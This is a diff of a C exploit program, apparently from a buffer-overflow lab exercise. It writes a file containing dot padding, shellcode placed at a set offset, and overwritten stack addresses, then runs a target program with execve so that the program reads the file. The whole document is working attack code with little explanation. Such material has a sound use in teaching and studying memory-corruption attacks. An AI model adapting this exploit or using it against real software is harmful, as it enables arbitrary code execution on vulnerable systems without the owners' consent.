@@ -16,29 +16,25 @@ int main() {
     FILE *fp;
 	char *args[4];
 	char *env[1];
-    char argbuf[309]; // 1024 for buffer, 4 for ebp, 4 for eip
-    long buf_addr = 0xffbfdc70;
+    unsigned char argbuf[4017]; // 1024 for buffer, 4 for ebp, 4 for eip
+    unsigned char mod[] = "\xa8\x0f\x00\x00\xa4\x0f\x00\x00\x98\xde\xbf\xff\xa4\xd0\xbf\xff";
+
     size_t i, len;
+    char *ptr;
+
     // create the argbuf
-    strcpy(argbuf, shellcode);
-    // fill the argbuf with dot
-    len = strlen(argbuf);
+    memset(argbuf, '.', sizeof(unsigned char)*4016);
 
-    for(i = len; i < 308; i++){
-        argbuf[i] = '.';
-    }
+    ptr = argbuf + 984;
+    memcpy(ptr, shellcode, strlen(shellcode));
 
-    strcpy(argbuf+100, "\x01\x02\x03\x04\x05\x06\x10\x11");
+    ptr = argbuf + 4000;
+    memcpy(ptr, mod, 16);
 
     fp = fopen("file.txt", "wb");
-    fprintf(fp, "%s", argbuf);
+    fwrite(argbuf, 1, sizeof(argbuf), fp);
     fclose(fp);
-    // get the buffer location using gdb
-    //long buffer_addr = 0xffbfdb68;
-	// one way to invoke submit
-	//system(TARGET "\"Hello world!\"");
 
-	// another way
 	args[0] = TARGET;
 	args[1] = "file.txt"; 
     args[2] = NULL;
@@ -49,7 +45,7 @@ int main() {
 	if(execve(TARGET, args, env) < 0){
         fprintf(stderr, "execve failed\n");
     }
-	// execve only returns if it fails
+
 	
 	return 1;
 }
